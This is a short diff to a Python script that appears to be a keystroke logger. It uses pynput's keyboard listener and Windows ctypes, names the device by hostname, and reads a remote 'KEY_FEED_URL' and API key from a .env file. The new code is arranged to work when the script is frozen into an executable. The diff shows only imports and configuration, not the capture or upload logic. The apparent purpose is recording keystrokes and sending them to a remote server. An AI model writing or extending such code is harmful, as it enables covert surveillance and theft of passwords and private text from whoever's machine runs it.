@@ -5,15 +5,24 @@ import hashlib
 import platform
 import socket
 import ctypes
+import sys
 from ctypes import wintypes
+from pathlib import Path
 from queue import Queue
 from threading import Lock, Thread
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 
+from dotenv import load_dotenv
 from pynput.keyboard import Key, KeyCode, Listener
 
 MESSAGE_GAP_MS = 2500
+ENV_PATH = (
+    Path(sys.executable).with_name(".env")
+    if getattr(sys, "frozen", False)
+    else Path(__file__).with_name(".env")
+)
+load_dotenv(ENV_PATH)
 SITE_URL = os.getenv("KEY_FEED_URL", "https://your-app.onrender.com").rstrip("/")
 API_KEY = os.getenv("KEY_FEED_API_KEY", "")
 device_name = platform.node() or socket.gethostname() or "Unknown device"
